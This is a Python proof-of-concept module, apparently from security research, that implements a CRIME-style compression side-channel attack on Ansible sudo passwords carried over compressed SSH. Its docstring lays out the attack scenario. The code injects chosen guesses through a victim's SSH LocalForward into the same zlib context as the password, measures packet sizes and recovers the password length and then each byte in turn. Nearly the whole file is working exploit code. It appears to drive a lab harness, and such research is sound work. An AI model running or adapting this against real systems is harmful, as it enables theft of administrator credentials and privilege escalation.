"""CRIME-style chosen-payload attack against Ansible sudo passwords.

Scenario
--------
The victim runs ``ansible-playbook`` periodically (e.g. from cron, or as
part of a CI pipeline) and the playbook uses ``become: yes`` with the
default ``sudo`` method.  Each run:

1. spawns a fresh ``ssh`` subprocess governed by ``~/.ssh/config``,
2. opens a session channel and runs a ``sudo -S -p "..."`` exec request,
3. writes the become password to ssh's stdin after the sudo prompt
   appears, which OpenSSH wraps in a single ``SSH_MSG_CHANNEL_DATA``
   packet on the session channel.

Ansible's default ``ssh_args`` include ``-C``, so **compression is on
by default**.  The victim has a ``LocalForward`` directive in their
ssh_config that Ansible inherits automatically (for instance, a
forwarded database port the operator set up long ago and forgot
about).  That forward is reachable by an attacker on the same network
segment as the client.  Whenever the forward is listening, an Ansible
run is in progress; the attacker connects, opens a ``direct-tcpip``
channel through the live SSH connection, and injects one CRIME guess
into the same zlib compression context as the sudo password.

To keep the wire model simple, the PoC disables SSH multiplexing
(``ControlMaster=no``) in ``ansible.cfg``.  That means **each guess is
a fresh SSH connection with a fresh zlib context**, which gives us
three pleasant properties:

  * No flushing -- the LZ77 window is already empty at the start of
    every iteration, so we don't need a 33 KiB evictor step.
  * The session channel is always server-ID 0 (first and only
    channel), so the CHANNEL_DATA-header prefix matches every time.
  * Each ansible-playbook run's lifecycle is self-contained: killing
    the subprocess also releases the LocalForward binding, and the
    next iteration starts from a clean slate.

The price is that we pay an SSH handshake on every iteration.

Known prefix
------------
The bytes that precede the password in the client->server zlib stream
are the ``SSH_MSG_CHANNEL_DATA`` header of the sudo-password packet::

    \\x5e              SSH_MSG_CHANNEL_DATA  (byte 94)
    \\x00\\x00\\x00\\x00  recipient channel = 0 (first server-side channel)
    \\x00\\x00\\x00\\xLL  data length as uint32 big-endian

For passwords < 16 MB, the first three bytes of the length field are
always zero, so the first 8 bytes ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``
are fully predictable.  The 9th byte is the sudo password length (plus
one, for the trailing ``\\n`` that Ansible appends -- see
``plugins/connection/ssh.py`` line 1300 in ansible-core).  The attack
runs in two phases:

    **Phase 1**: known prefix = ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``
    (8 bytes).  Alphabet = plausible length bytes (``\\x01..\\x20``).
    Recovers the length byte ``\\xLL``.

    **Phase 2**: known prefix = ``\\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xLL``
    (9 bytes, fully known).  Alphabet = password character set.
    Recovers the password byte-by-byte, then hits the trailing ``\\n``
    as the natural terminator.
"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import Any

from attack import (
    CLIENT_BASE,
    LISTEN_PORT,
    _c2s_total,
    _make_noise,
    run_attack as _run_attack,
)

LOG = logging.getLogger("attack_ansible")

CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))


async def _open_ansible_tunnel(retries: int = 20, delay: float = 0.25):
    """Open a TCP connection to the client's Ansible LocalForward port.

    This port is only listening while an ansible-playbook run is active,
    i.e. while the session channel running ``sleep 120`` is alive.  The
    ``_send_secret_ansible`` trigger in the sweep below is what keeps a
    run alive long enough for us to connect.
    """
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, ANSIBLE_TUNNEL_PORT)
        except (OSError, ConnectionRefusedError) as exc:
            if attempt < retries:
                LOG.warning("ansible-tunnel connect attempt %d: %s", attempt, exc)
                await asyncio.sleep(delay)
            else:
                raise
    raise RuntimeError("unreachable")


async def _trigger_ansible(session) -> None:
    """Ask the client to kick off a fresh ansible-playbook run.

    The client kills any previous run first, then spawns a new
    ``ansible-playbook`` with ``become: yes`` and waits for the
    ``Sending become_password in response to prompt`` marker before
    returning -- so when this helper returns, the sudo-password
    ``CHANNEL_DATA`` has already been written to ssh's stdin and is on
    its way across the wire.
    """
    async with session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
        body = await r.json()
        if not body.get("ok", False):
            raise RuntimeError(f"send_secret_ansible failed: {body}")


# ---------------------------------------------------------------------------
# single-round sweep (Ansible variant)
# ---------------------------------------------------------------------------

async def _sweep_round_ansible(
    session,
    packet_log,
    prefix: bytes,
    alphabet: list[bytes],
    noise_lengths: list[int],
    settle: float,
    flush_bytes: int,  # unused -- fresh zlib context per iteration
) -> tuple[dict[bytes, int], dict[int, dict[bytes, int]]]:
    """One noise-length sweep for the Ansible variant.

    Ordering within each (candidate, noise_length) iteration:

      1. Trigger a fresh ansible-playbook run via
         ``/send_secret_ansible``.  The client kills any previous run,
         starts a new one, and blocks until the sudo password has been
         written to ssh's stdin.  When this call returns, the password
         ``CHANNEL_DATA`` is already on the wire and the LocalForward
         port is listening (the ansible ssh slave is still running the
         ``raw: sleep 2`` keepalive task).
      2. Open a TCP connection to the Ansible LocalForward port
         (CHANNEL_OPEN direct-tcpip on the ansible ssh -- its
         originator port is random per connection, contributing
         bit-alignment jitter).
      3. Settle so the CHANNEL_OPEN packets are observed by scapy.
      4. Clear the packet log (wipe the CHANNEL_OPEN from it).
      5. Write ``prefix + candidate + noise`` on the measure tunnel.
         The ansible ssh wraps this as CHANNEL_DATA on the attacker's
         direct-tcpip channel -- the same zlib context as the sudo
         password.
      6. Settle so the new CHANNEL_DATA is observed by scapy.
      7. Read the packet log, summing c->s payload bytes.
      8. Close the measure tunnel.

    There is no flush step: each iteration runs through a fresh SSH
    connection with a fresh zlib context, so there is nothing to evict.
    """
    sums: dict[bytes, int] = {c: 0 for c in alphabet}
    per_nl: dict[int, dict[bytes, int]] = {
        nl: {c: 0 for c in alphabet} for nl in noise_lengths
    }
    for noise_len in noise_lengths:
        noise = _make_noise(noise_len)
        for cb in alphabet:
            # 1. Fire ansible-playbook (kills previous, starts fresh).
            try:
                await _trigger_ansible(session)
            except Exception as exc:  # noqa: BLE001
                LOG.warning("ansible trigger failed: %s", exc)
                per_nl[noise_len][cb] = 0
                continue

            # 2. Open the measure tunnel (new direct-tcpip channel).
            try:
                _, mw = await _open_ansible_tunnel()
            except OSError as exc:
                LOG.warning(
                    "measure tunnel open failed for cand=%r nl=%d: %s",
                    cb, noise_len, exc,
                )
                per_nl[noise_len][cb] = 0
                continue

            # 3. Let CHANNEL_OPEN traffic reach the sniffer.
            if settle > 0:
                await asyncio.sleep(settle)

            # 4-7. Clear, write guess, settle, read.
            packet_log.clear()
            try:
                mw.write(prefix + cb + noise)
                await mw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError) as exc:
                LOG.warning("measure write failed: %s", exc)
            if settle > 0:
                await asyncio.sleep(settle)
            measured = _c2s_total(packet_log.snapshot())
            sums[cb] += measured
            per_nl[noise_len][cb] = measured

            # 8. Close the measure tunnel.
            try:
                mw.close()
            except Exception:  # noqa: BLE001
                pass

    return sums, per_nl


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

# Phase-1 default prefix: the 8 fully-predictable bytes of the SSH
# CHANNEL_DATA header for a session-channel packet (type 0x5e + recipient
# channel 0 + first 3 bytes of the uint32 length field).  The ninth byte
# is the password length, which Phase 1 recovers.
DEFAULT_KNOWN_PREFIX = b"\x5e\x00\x00\x00\x00\x00\x00\x00"


async def run_attack(
    packet_log,
    known_prefix: bytes = DEFAULT_KNOWN_PREFIX,
    settle: float = 0.1,
    min_margin: int = 8,
    max_rounds: int = 96,
    flush_bytes: int = 0,  # fresh zlib context per guess, no flush
    **kwargs: Any,
) -> dict[str, Any]:
    """Run the Ansible-model attack.

    The default ``known_prefix`` is the 8-byte CHANNEL_DATA header
    before the password length byte.  The attack is normally driven in
    two phases by ``test_attack_ansible.py``:

    * Phase 1: ``known_prefix = \\x5e\\x00\\x00\\x00\\x00\\x00\\x00\\x00``,
      ``max_length=1``, alphabet = plausible length bytes, recovers the
      password length byte.
    * Phase 2: ``known_prefix = <phase-1 prefix> + <length byte>``,
      alphabet = password character set, recovers the password.

    Adaptive noise is turned off because each iteration runs in a fresh
    zlib context: the per-round "productive noise lengths" signal that
    the direct variant uses doesn't generalise across connections.  In
    practice the fresh-connection model produces a remarkably clean
    signal -- no flush residue, no previous-guess back-references, and
    the session-channel-header prefix is an exact match -- so the
    default ``min_margin`` can be as low as 8 (half the direct
    variant's 16).  The ``settle=0.1`` default is on the high side
    because the scapy sniffer occasionally drops a single late packet
    when the per-iteration cadence gets fast enough, which shifts the
    candidate-sum parity by ``20 mod 8 = 4`` -- not enough to change
    the ranking under ``min_margin=8`` but enough to produce
    impossible-looking margins in the round log.
    """
    return await _run_attack(
        packet_log=packet_log,
        known_prefix=known_prefix,
        settle=settle,
        min_margin=min_margin,
        max_rounds=max_rounds,
        flush_bytes=flush_bytes,
        sweep_fn=_sweep_round_ansible,
        adaptive_noise=False,
        **kwargs,
    )
